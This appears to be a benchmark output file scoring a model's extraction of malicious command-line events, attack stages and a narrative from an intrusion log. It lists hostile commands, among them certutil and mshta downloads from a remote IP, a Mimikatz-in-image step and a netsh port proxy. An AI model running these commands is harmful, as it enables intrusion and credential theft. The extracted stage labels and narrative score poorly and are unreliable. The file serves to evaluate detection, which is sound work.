@@ -1,0 +1,144 @@
+{
+  "output": {
+    "malicious_events": [
+      {
+        "command": "C:\\Windows\\System32\\smartscreen.exe -Embedding",
+        "stage": "Initial Access"
+      },
+      {
+        "command": "certutil -urlcache -split -f http://example.com/x.exe C:\\x.exe",
+        "stage": "Persistence"
+      },
+      {
+        "command": "CertUtil.exe -decode a.txt b.txt",
+        "stage": "Discovery"
+      },
+      {
+        "command": "C:\\Windows\\System32\\rundll32.exe C:\\WINDOWS\\system32\\FontCacheInvalidationTask.dll,FontCacheInvalidationTaskClass @\"C:\\Windows\\System32\\\\PerfLogs\\\\PerfLogs\"",
+        "stage": "Defense Evasion"
+      },
+      {
+        "command": "perfc.dat",
+        "stage": "Collection"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\47\ufffd\u0536\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\u02bc\ufffdB.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "powershell.exe -ExecutionPolicy Bypass -C .\\chromeRemoteServices.ps1",
+        "stage": "Execution"
+      },
+      {
+        "command": "cmd.exe /C systeminfo",
+        "stage": "Discovery"
+      },
+      {
+        "command": "cmd.exe /C \"certutil -urlcache -split -f  http://124.223.85.207:8082/Test.hta\"",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "CMD - /C mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Execution"
+      },
+      {
+        "command": "CMD - /C mshta.exe http://124.223.85.207:8082/T1218.005.hta",
+        "stage": "Execution"
+      },
+      {
+        "command": "netsvcs",
+        "stage": "Discovery"
+      },
+      {
+        "command": "net time \\127.0.0.1",
+        "stage": "Discovery"
+      },
+      {
+        "command": "whoami",
+        "stage": "Discovery"
+      },
+      {
+        "command": "netstat -an ",
+        "stage": "Discovery"
+      },
+      {
+        "command": "arp -a",
+        "stage": "Discovery"
+      },
+      {
+        "command": "route print -4",
+        "stage": "Discovery"
+      },
+      {
+        "command": "invoke-webrequest http://124.223.85.207:8082/Test.hta -method post-usebasicparsing-contenttype application/json",
+        "stage": "Command and Control"
+      },
+      {
+        "command": "powershell.exe -executionpolicy bypass -c import-module .\\invokepsimage.ps1; invoke-psimage -script .\\invoke-mimikatz.ps1 -out .\\evil-kiwi.png -image .\\995647.jpg",
+        "stage": "Credential Access"
+      },
+      {
+        "command": "netsh interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "netsh.exe interface portproxy add v4tov4 listenport=65535 connectaddress=127.0.0.1 connectport=22 listenaddress=127.0.0.1 protocol=tcp",
+        "stage": "Lateral Movement"
+      },
+      {
+        "command": "tor.lnk",
+        "stage": "Execution"
+      },
+      {
+        "command": "rundll32.exe C:\\windows\\system32\\PcaSvc.dll,PcaPatchSdbTask",
+        "stage": "Execution"
+      }
+    ],
+    "narrative": "The attack begins with smartscreen.exe executing an unknown command (-Embedding), likely initiating the process. CertUtil is then utilized to decode files (a.txt -> b.txt), suggesting an attempt to execute or verify encoded payloads. FontCacheInvalidationTask.dll is executed via Rundll32, possibly to disable signature checks or inject code into legitimate processes. Perfc.dat may be dropped or manipulated, indicating data collection activities. PowerShell scripts (.ps1 files) are executed in several instances, likely for credential dumping or lateral movement. Various commands like 'systeminfo', 'net time', 'whoami', 'netstat', 'arp', and 'route print' are run, aiming to gather system information. HTTP requests to remote servers suggest communication with command and control infrastructure. Mimikatz is loaded through PSImage modules, targeting credential access. PortProxy configurations are altered using Netsh, facilitating lateral movement over TCP port 22. Tor links indicate an effort to anonymize communications. Lastly, PcaSvc.dll is invoked, possibly to manipulate patch management services.",
+    "_parse_ok": true,
+    "_cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 85185,
+      "completion_tokens": 10809,
+      "total_tokens": 95994,
+      "wall_clock_s": 233.841,
+      "parse_retries": 4
+    }
+  },
+  "score": {
+    "event": {
+      "precision": 0.08695652173913043,
+      "recall": 0.08695652173913043,
+      "f1": 0.08695652173913043,
+      "tp": 2,
+      "fp": 21,
+      "fn": 21
+    },
+    "stage": {
+      "precision": 0.08695652173913043,
+      "recall": 0.08695652173913043,
+      "f1": 0.08695652173913043,
+      "tp": 2,
+      "fp": 21,
+      "fn": 21,
+      "recall_partial": 0.08695652173913043
+    },
+    "hallucination_rate": 0.3076923076923077,
+    "cost": {
+      "llm_calls": 6,
+      "prompt_tokens": 85185,
+      "completion_tokens": 10809,
+      "total_tokens": 95994,
+      "wall_clock_s": 233.841,
+      "parse_retries": 4
+    }
+  },
+  "meta": {
+    "variant": "primus_v4",
+    "max_tokens": 4096,
+    "prompt_variant": "stagedefs",
+    "gpu": "NVIDIA RTX 6000 Ada Generation",
+    "triage": true,
+    "got_link_hints": false
+  }
+}
